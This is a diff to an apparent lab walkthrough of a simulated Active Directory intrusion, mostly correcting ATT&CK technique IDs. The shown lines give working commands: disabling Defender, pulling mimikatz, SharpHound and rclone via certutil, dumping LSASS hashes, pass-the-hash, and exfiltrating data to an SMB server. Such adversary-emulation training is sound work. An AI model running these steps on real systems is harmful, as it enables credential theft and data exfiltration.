@@ -77,14 +77,16 @@ Is Windows Defender running?
 ```PowerShell
 [ITSERVER:PowerShell] Get-MpComputerStatus
 ```
-ATT&CK Techniques: `?`
+ATT&CK Techniques: `T1057`
 
 ### Security tools tampering
 
 We see that we have admin privileges on this system, let's disable some security tools to make our life simpler...
 
-Re-open PowerShell as Administrator and let's disable a bunch of useful things in Windows Defender.
-We can turn off realtime monitoring (which includes antivirus), behavior monitoring, script scanning, and blocking at first sight.
+> [!IMPORTANT]
+> Re-open PowerShell as Administrator
+
+Now let's disable a bunch of useful things in Windows Defender. We can turn off realtime monitoring (which includes antivirus), behavior monitoring, script scanning, and blocking at first sight.
 
 **Step 7**
 ```PowerShell
@@ -109,7 +111,7 @@ We can transfer the tool using `certutil`
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 And then execute it to dump the credentials from LSASS process (make sure PowerShell is running with admin privileges)
 
@@ -129,6 +131,9 @@ You should be able to see the NTLM hash of `billh` domain user and can now use i
 While still in `mimikatz` we can use that hash of the domain user (`ATTACKRANGE\billh`) in an Pass-the-Hash attack to start a PowerShell with a Kerberos ticket belonging to that user (i.e. impersonate that user).
 
 **Step 10**
+> [!IMPORTANT]
+> Replace \<NTLM-hash\> with the actual sting obtained from the previous step
+
 ```PowerShell
 [ITSERVER:mimikatz] sekurlsa::pth /user:billh /ntlm:<NTLM-hash> /domain:attackrange /run:powershell
 ```
@@ -147,7 +152,7 @@ We can download the data collector with `certutil` as before
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/SharpHound.exe C:\Temp\sh.exe
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 And then run it to collect all data about the domain, its users, computers, groups and their privileges
 
@@ -167,7 +172,10 @@ Let's download `rclone` executable on the system first:
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
+
+> [!IMPORTANT]
+> When saving the file in Notepad select "Save as" and "Save as type: All files" so no .txt is appended to the filename.
 
 Then we'll need to create a config file for `rclone` and put it in `C:\Temp\r.conf`:
 
@@ -179,7 +187,7 @@ host = 10.0.1.30
 user = user
 pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8
 ```
-ATT&CK Techniques: `?`
+ATT&CK Techniques: `T1105` `T1564` `T1048`
 
 In the meantime, on our Kali machine, we will create a `loot` folder and start an SMB server with it:
 
@@ -191,6 +199,9 @@ In the meantime, on our Kali machine, we will create a `loot` folder and start a
 Now that SMB server is running and our `rclone` is ready, let's copy the AD dump file from Windows to Kali:
 
 **Step 15**
+> [!IMPORTANT]
+> Replace \<c.zip-filename\> with the actual name of the ZIP file created
+
 ```PowerShell
 [ITSERVER:PowerShell] C:\Temp\r.exe --config C:\Temp\r.conf copy C:\Temp\<c.zip-filename> ss:data --no-check-dest
 ```
@@ -200,12 +211,9 @@ ATT&CK Techniques: `T1048`
 
 ### Import AD dump into Bloodhound and find path to Domain Admins
 
-Start the Bloodhound
+Now you will need to go to `http://localhost:8080` in your browser, login as `admin` user with your attack range password.
 
-```bash
-[KALI:bash] sudo bloodhound
-```
-After a short while, the Bloodhound should be running, so let's open `http://localhost:8080`, login with user `admin` and password `admin` (you will be prompted to change it) and import the ZIP file into Bloodhound.
+After logging into Bloodhound, go to Administration section and File Ingest and import the ZIP file into it.
 
 We mark our AD user as compromised and then we find a path from the compromised principal to Domain Admins
 
@@ -225,7 +233,7 @@ Usually it comes with RSAT AD tools, but we can also get it directly from the Mi
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/PowerShellActiveDirectory.dll C:\Temp\a.dll
 [ITSERVER:PowerShell] Import-Module C:\Temp\a.dll
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 `GenericWrite` persmissions that we have on our compormised account mean that we can add ourselves to the `ITSupport` group. Let's do that!
 
@@ -272,7 +280,7 @@ We can now download the `rclone` executable:
 ```PowerShell
 [FINSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 And create a config file `C:\Temp\r.conf`:
 
@@ -284,7 +292,7 @@ host = 10.0.1.30
 user = user
 pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8
 ```
-ATT&CK Techniques: `?`
+ATT&CK Techniques: `T1105` `T1564` `T1048`
 
 Then we start the SMB server on Kali:
 
